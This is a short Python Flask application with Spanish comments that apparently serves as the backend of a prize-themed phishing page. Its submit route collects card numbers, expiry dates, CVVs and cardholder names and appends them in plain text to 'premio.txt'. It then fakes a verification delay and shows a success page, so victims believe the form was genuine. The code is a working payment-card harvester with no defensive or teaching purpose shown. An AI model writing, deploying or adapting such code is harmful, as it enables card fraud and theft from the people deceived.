from flask import Flask, render_template, request, redirect, url_for
import time
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Recoger los datos del formulario
    card_number = request.form.get('card_number')
    expiry_date = request.form.get('expiry_date')
    cvv = request.form.get('cvv')
    card_name = request.form.get('card_name')
    
    # Guardar los datos en premio.txt
    with open('premio.txt', 'a') as f:
        f.write(f"Número de tarjeta: {card_number}\n")
        f.write(f"Fecha de vencimiento: {expiry_date}\n")
        f.write(f"CVV: {cvv}\n")
        f.write(f"Nombre en la tarjeta: {card_name}\n")
        f.write("="*50 + "\n")
    
    # Simular tiempo de verificación
    time.sleep(3)
    
    return redirect(url_for('success'))

@app.route('/success')
def success():
    return render_template('success.html')

if __name__ == '__main__':
    app.run(debug=True)
